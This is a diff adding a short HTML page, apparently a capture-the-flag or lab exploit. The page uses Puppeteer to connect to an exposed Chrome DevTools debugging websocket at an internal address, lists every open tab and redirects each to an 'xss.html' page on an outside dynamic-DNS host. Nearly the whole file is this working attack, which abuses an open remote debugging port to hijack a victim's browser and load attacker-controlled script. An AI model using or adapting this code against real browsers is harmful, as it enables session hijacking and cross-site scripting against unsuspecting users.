@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <title>Redirect</title>
+</head>
+<body>
+    <h1>Redirect All pages to xss.html</h1>
+    <script src='./puppeteer-web.js'></script>
+    <script>
+
+        const puppeteer = require('puppeteer');
+
+        (async (endpoint) => {
+          const browser = await puppeteer.connect({
+            browserWSEndpoint: endpoint,
+            ignoreHTTPSErrors: true,
+          });
+          let pages = await browser.pages();
+          pages.forEach(page => {
+              console.log(page.url());
+              page.goto("http://igorxp5.ddns.net:8000/xss.html");
+          });
+          browser.disconnect();
+        })("ws://172.23.0.2:9222/devtools/browser/2a60da05-4dca-4795-abea-4658dcfe4b2c");
+    </script>
+</body>
+</html>
